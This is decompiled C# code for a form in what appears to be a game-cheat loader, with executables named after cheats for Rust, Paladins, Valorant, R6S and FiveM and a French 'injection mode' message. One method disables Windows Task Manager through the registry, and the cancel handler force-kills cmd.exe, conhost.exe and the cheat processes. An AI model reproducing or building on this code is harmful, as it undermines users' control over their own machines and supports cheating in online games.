using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;

namespace v1go
{
	// Token: 0x02000004 RID: 4
	public partial class WaitForGame : Form
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002640 File Offset: 0x00000840
		public void disable()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			bool flag = registryKey.GetValue("DisableTaskMgr") == null;
			if (flag)
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002684 File Offset: 0x00000884
		public void enable()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.DeleteValue("DisableTaskMgr");
			registryKey.Close();
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000020E1 File Offset: 0x000002E1
		public WaitForGame(string game, string exe)
		{
			this.game = game;
			this.exe = exe;
			this.InitializeComponent();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000026B8 File Offset: 0x000008B8
		private void Startup_Load(object sender, EventArgs e)
		{
			this.lblPleaseWait.Text = string.Format("Vous êtes en mode injections pour {0}...", this.game);
			this.tmrLoad.Interval = 18000;
			this.tmrLoad.Start();
			base.CenterToScreen();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002107 File Offset: 0x00000307
		private void tmrLoad_Tick(object sender, EventArgs e)
		{
			this.tmrLoad.Stop();
			base.Close();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000211D File Offset: 0x0000031D
		private void btnCancel_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002126 File Offset: 0x00000326
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002708 File Offset: 0x00000908
		private void btnCancel_Click_1(object sender, EventArgs e)
		{
			Process.Start("taskkill", "/F /IM DarlingFN.exe");
			Process.Start("taskkill", "/F /IM cmd.exe");
			Process.Start("taskkill", "/F /IM conhost.exe");
			Process.Start("taskkill", "/F /IM lmap.exe");
			Process.Start("taskkill", "/F /IM PaladinsHack.exe");
			Process.Start("taskkill", "/F /IM rustcheat.exe");
			Process.Start("taskkill", "/F /IM Darling_SOT.exe");
			Process.Start("taskkill", "/F /IM DarlingCookiesFiveM.exe");
			Process.Start("taskkill", "/F /IM DarlingR6S.exe");
			Process.Start("taskkill", "/F /IM DarlingValorant.exe");
			this.enable();
			Process.Start("taskkill", "/F /IM DarlingLoader.exe");
		}

		// Token: 0x04000004 RID: 4
		private string game;

		// Token: 0x04000005 RID: 5
		private string exe;
	}
}
